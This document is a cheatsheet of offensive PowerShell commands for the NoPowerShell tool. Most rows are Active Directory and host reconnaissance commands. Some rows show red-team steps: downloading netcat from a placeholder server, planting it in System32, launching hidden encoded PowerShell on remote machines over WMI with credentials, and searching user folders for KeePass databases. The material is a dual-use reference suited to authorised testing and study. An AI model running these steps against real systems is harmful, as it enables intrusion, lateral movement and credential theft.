# Cheatsheet
Cheatsheet of offensive PowerShell commands that are supported by NoPowerShell.

| Action | Command |
| - | - |
| Get the sites from the configuration naming context | `Get-ADObject -LDAPFilter "(objectClass=site)" -SearchBase "CN=Configuration,DC=MyDomain,DC=local" -Properties whenCreated,cn` |
| Get specific object | `Get-ADObject -Identity "CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=MyDomain,DC=local" -Properties *` |
| List all global groups | `Get-ADObject -LDAPFilter "(GroupType:1.2.840.113556.1.4.803:=2)" -SearchBase "DC=MyDomain,DC=local"` |
| List trusts | `Get-ADTrust` |
| List trusts recursively till depth 3 | `Get-ADTrust -Depth 3` |
| List all details of a certain trust | `Get-ADTrust -LDAPFilter "(Name=mydomain.com)"` |
| List specific details of a certain trust | `Get-ADTrust -LDAPFilter "(Name=mydomain.com)" -Properties Name,trustDirection,securityIdentifier` |
| List all user groups in domain | `Get-ADGroup -Filter *` |
| List all administrative groups in domain | `Get-ADGroup -LDAPFilter "(admincount=1)" \| select Name` |
| List all members of the "Domain Admins" group | `Get-ADGroupMember -Identity "Domain Admins"` |
| List all members of the "Domain Admins" group - Alternative | `Get-ADGroupMember "Domain Admins"` |
| List all properties of the DC01 domain computer | `Get-ADComputer -Identity DC01 -Properties *` |
| List all Domain Controllers | `Get-ADComputer -LDAPFilter "(msDFSR-ComputerReferenceBL=*)"` |
| List all computers in domain | `Get-ADComputer -Filter *` |
| List domain controllers | `Get-ADComputer -searchBase "OU=Domain Controllers,DC=bitsadmin,DC=local" -Filter *` |
| List specific attributes of the DC01 domain computer | `Get-ADComputer DC01 -Properties Name,operatingSystem` |
| List all properties of the Administrator domain user | `Get-ADUser -Identity Administrator -Properties *` |
| List all Administrative users in domain | `Get-ADUser -LDAPFilter "(admincount=1)"` |
| List all users in domain | `Get-ADUser -Filter *` |
| List specific attributes of user | `Get-ADUser Administrator -Properties SamAccountName,ObjectSID` |
| List all users in a specific OU | `Get-ADUser -SearchBase "CN=Users,DC=MyDomain,DC=local" -Filter *` |
| Show the current user | `whoami` |
| Query sessions on local machine | `Get-WinStation` |
| Query sessions on a remote machine | `Get-WinStation -Server DC01.domain.local` |
| Query sessions on a remote machine - Alternative | `qwinsta DC01.domain.local` |
| List SMB shares of MyServer | `Get-RemoteSmbShare \\MyServer` |
| Extract zip | `Expand-Archive -Path C:\MyArchive.zip -DestinationPath C:\Extracted` |
| Extract zip - Alternative | `unzip C:\MyArchive.zip C:\Extracted` |
| Extract zip into current directory | `unzip C:\MyArchive.zip` |
| Compress folder to zip | `Compress-Archive -Path C:\MyFolder -DestinationPath C:\MyFolder.zip` |
| Compress folder to zip - Alternative | `zip C:\MyFolder C:\MyFolder.zip` |
| List all processes containing PowerShell in the process name | `Get-Process \| ? Name -Like *PowerShell*` |
| List all active local users | `Get-LocalUser \| ? Disabled -EQ False` |
| Get help for a command | `Get-Help -Name Get-Process` |
| Get help for a command - Alternative | `man ps` |
| List all commands supported by NoPowerShell | `Get-Command` |
| List commands of a certain module | `Get-Command -Module ActiveDirectory` |
| Resolve domain name | `Resolve-DnsName microsoft.com` |
| Resolve domain name - Alternative | `host linux.org` |
| Lookup specific record | `Resolve-DnsName -Type MX pm.me` |
| Reverse DNS lookup | `Resolve-DnsName 1.1.1.1` |
| List all active members of the Administrators group | `Get-LocalGroupMember -Group Administrators \| ? Disabled -eq False` |
| List all local groups | `Get-LocalGroup` |
| List details of a specific group | `Get-LocalGroup Administrators` |
| List members of Administrators group on a remote computer using WMI | `Get-LocalGroup -ComputerName Myserver -Username MyUser -Password MyPassword -Name Administrators` |
| List members of Administrators group on a remote computer using WMI - Alternative | `Get-LocalGroup -ComputerName Myserver -Name Administrators` |
| List all local users | `Get-LocalUser` |
| List details of a specific user | `Get-LocalUser -Name Administrator` |
| List details of a specific user - Alternative | `Get-LocalUser Administrator` |
| List details of a specific user on a remote machine using WMI | `Get-LocalUser -ComputerName MyServer -Username MyUser -Password MyPassword -Name Administrator` |
| List details of a specific user on a remote machine using WMI - Alternative | `Get-LocalUser -ComputerName MyServer Administrator` |
| Copy file from one location to another | `Copy-Item C:\Tmp\nc.exe C:\Windows\System32\nc.exe` |
| Copy file from one location to another - Alternative | `copy C:\Tmp\nc.exe C:\Windows\System32\nc.exe` |
| Copy folder | `copy C:\Tmp\MyFolder C:\Tmp\MyFolderBackup` |
| Gracefully stop processes | `Stop-Process -Id 4512,7241` |
| Kill process | `Stop-Process -Force -Id 4512` |
| Kill all cmd.exe processes | `Get-Process cmd \| Stop-Process -Force` |
| List processes | `Get-Process` |
| List processes - Alternative | `ps` |
| List processes on remote host using WMI | `Get-Process -ComputerName dc01.corp.local -Username Administrator -Password P4ssw0rd!` |
| List processes on remote host using WMI - Alternative | `ps -ComputerName dc01.corp.local` |
| List drives | `Get-PSDrive` |
| List drives - Alternative | `gdr` |
| Launch process | `Invoke-WmiMethod -Class Win32_Process -Name Create "cmd /c calc.exe"` |
| Launch process on remote system | `Invoke-WmiMethod -ComputerName MyServer -Username MyUserName -Password MyPassword -Class Win32_Process -Name Create "powershell -NoP -W H -E ZQBjAGgAbwAgACcASABlAGwAbABvACAATgBvAFAAbwB3AGUAcgBTAGgAZQBsAGwAIQAnAA=="` |
| Launch process on remote system - Alternative | `iwmi -ComputerName MyServer -Class Win32_Process -Name Create "powershell -NoP -W H -E ZQBjAGgAbwAgACcASABlAGwAbABvACAATgBvAFAAbwB3AGUAcgBTAGgAZQBsAGwAIQAnAA=="` |
| View contents of a file | `Get-Content C:\Windows\WindowsUpdate.log` |
| View contents of a file - Alternative | `cat C:\Windows\WindowsUpdate.log` |
| Locate KeePass files in the C:\Users\ directory | `Get-ChildItem -Recurse -Force C:\Users\ -Include *.kdbx` |
| Locate KeePass files in the C:\Users\ directory - Alternative | `ls -Recurse -Force C:\Users\ -Include *.kdbx` |
| List the keys under the SOFTWARE key in the registry | `ls HKLM:\SOFTWARE` |
| Search for files which can contain sensitive data on the C-drive | `ls -Recurse -Force C:\ -Include *.cmd,*.bat,*.ps1,*.psm1,*.psd1` |
| List local shares | `Get-WmiObject -Namespace ROOT\CIMV2 -Query "Select * From Win32_Share Where Name LIKE '%$'"` |
| List local shares - Alternative | `gwmi -Class Win32_Share -Filter "Name LIKE '%$'"` |
| Obtain data of Win32_Process class from a remote system and apply a filter on the output | `Get-WmiObject "Select ProcessId,Name,CommandLine From Win32_Process" -ComputerName dc01.corp.local -Username MyUser -Password MyPassword \| ? Name -Like *PowerShell* \| select ProcessId,CommandLine` |
| Obtain data of Win32_Process class from a remote system and apply a filter on the output - Alternative | `gwmi "Select ProcessId,Name,CommandLine From Win32_Process" -ComputerName dc01.corp.local \| ? Name -Like *PowerShell* \| select ProcessId,CommandLine` |
| View details about a certain service | `Get-WmiObject -Class Win32_Service -Filter "Name = 'WinRM'"` |
| Get all hotfixes on the local computer | `Get-HotFix` |
| Get all hotfixes from a remote computer using WMI | `Get-HotFix -ComputerName MyServer -Username Administrator -Password Pa$$w0rd` |
| Get all hotfixes from a remote computer using WMI - Alternative | `Get-HotFix -ComputerName MyServer` |
| Delete a file | `Remove-Item C:\tmp\MyFile.txt` |
| Delete a file - Alternative | `rm C:\tmp\MyFile.txt` |
| Delete a read-only file | `Remove-Item -Force C:\Tmp\MyFile.txt` |
| Recursively delete a folder | `Remove-Item -Recurse C:\Tmp\MyTools\` |
| Put string on clipboard | `Set-Clipboard -Value "You have been PWNED!"` |
| Put string on clipboard - Alternative | `scb "You have been PWNED!"` |
| Clear the clipboard | `Set-Clipboard` |
| Place output of command on clipboard | `Get-Process \| Set-Clipboard` |
| Show current user's PATH variable | `Get-ItemPropertyValue -Path HKCU:\Environment -Name Path` |
| Show current user's PATH variable - Alternative | `gpv HKCU:\Environment Path` |
| Show information about the system | `Get-ComputerInfo` |
| Show information about the system - Alternative | `systeminfo` |
| Show information about the system not listing patches | `systeminfo -Simple` |
| Show information about a remote machine using WMI | `Get-ComputerInfo -ComputerName MyServer -Username MyUser -Password MyPassword` |
| Show information about a remote machine using WMI - Alternative | `Get-ComputerInfo -ComputerName MyServer` |
| Show text contents of clipboard | `Get-Clipboard` |
| Show text contents of clipboard - Alternative | `gcb` |
| List cached DNS entries on the local computer | `Get-DnsClientCache` |
| List cached DNS entries from a remote computer using WMI | `Get-DnsClientCache -ComputerName MyServer -Username Administrator -Password Pa$$w0rd` |
| List cached DNS entries from a remote computer using WMI - Alternative | `Get-DnsClientCache -ComputerName MyServer` |
| List autoruns in the registry | `Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run \| ft` |
| Send ICMP request to host | `Test-NetConnection 1.1.1.1` |
| Send ICMP request to host - Alternative | `tnc 1.1.1.1` |
| Send 2 ICMP requests to IP address 1.1.1.1 with half a second of timeout | `Test-NetConnection -Count 2 -Timeout 500 1.1.1.1` |
| Perform a traceroute with a timeout of 1 second and a maximum of 20 hops | `Test-NetConnection -TraceRoute -Timeout 1000 -Hops 20 bitsadm.in` |
| Perform ping with maximum TTL specified | `ping -TTL 32 1.1.1.1` |
| Check for open port | `tnc bitsadm.in -Port 80` |
| Show TCP connections on the local machine | `Get-NetTCPConnection` |
| Show TCP connections on the local machine - Alternative | `netstat` |
| Show TCP connections on a remote machine | `Get-NetTCPConnection -ComputerName MyServer` |
| List ARP table entries | `Get-NetNeighbor` |
| List ARP table entries - Alternative | `arp` |
| Show the IP routing table | `Get-NetRoute` |
| Show the IP routing table - Alternative | `route` |
| Show the IP routing table on a remote machine using WMI | `Get-NetRoute -ComputerName MyServer -Username MyUser -Password MyPassword` |
| Show the IP routing table on a remote machine using WMI - Alternative | `route -ComputerName MyServer` |
| Show network interfaces | `Get-NetIPAddress` |
| Show network interfaces - Alternative | `ipconfig` |
| Show network interfaces - Alternative | `ifconfig` |
| Show all network interfaces | `Get-NetIPAddress -All` |
| Show all network interfaces - Alternative | `ipconfig -All` |
| Show all network interfaces on a remote machine using WMI | `Get-NetIPAddress -All -ComputerName MyServer -Username MyUser -Password MyPassword` |
| Show all network interfaces on a remote machine using WMI - Alternative | `Get-NetIPAddress -All -ComputerName MyServer` |
| List SMB shares on the computer | `Get-SmbShare` |
| List network shares on the local machine that are exposed to the network | `Get-SmbMapping` |
| List network shares on the local machine that are exposed to the network - Alternative | `netuse` |
| Echo string to the console | `Write-Output "Hello World!"` |
| Echo string to the console - Alternative | `echo "Hello World!"` |
| Echo string to the console | `echo "Hello Console!"` |
| Create file hello.txt on the C: drive containing the "Hello World!" ASCII string | `Write-Output "Hello World!" \| Out-File -Encoding ASCII C:\hello.txt` |
| Create file hello.txt on the C: drive containing the "Hello World!" ASCII string - Alternative | `echo "Hello World!" \| Out-File -Encoding ASCII C:\hello.txt` |
| Count number of results | `Get-Process \| Measure-Object` |
| Count number of results - Alternative | `Get-Process \| measure` |
| Count number of lines in file | `gc C:\Windows\WindowsUpdate.log \| measure` |
| Download file from the Internet | `Invoke-WebRequest http://myserver.me/nc.exe` |
| Download file from the Internet - Alternative | `wget http://myserver.me/nc.exe` |
| Download file from the Internet specifying the destination | `wget http://myserver.me/nc.exe -OutFile C:\Tmp\netcat.exe` |
| Show only the Name in a file listing | `ls C:\ \| select Name` |
| Show first 10 results of file listing | `ls C:\Windows\System32 -Include *.exe \| select -First 10 Name,Length` |
| Sort processes by name descending | `ps \| sort -d name` |
| Format output as a table | `Get-Process \| Format-Table` |
| Format output as a table - Alternative | `Get-Process \| ft` |
| Format output as a table showing only specific attributes | `Get-Process \| ft ProcessId,Name` |
| Format output as a list | `Get-LocalUser \| Format-List` |
| Format output as a list - Alternative | `Get-LocalUser \| fl` |
| Format output as a list showing only specific attributes | `Get-LocalUser \| fl Name,Description` |
| Store list of commands as CSV | `Get-Command \| Export-Csv -Encoding ASCII -Path commands.csv` |
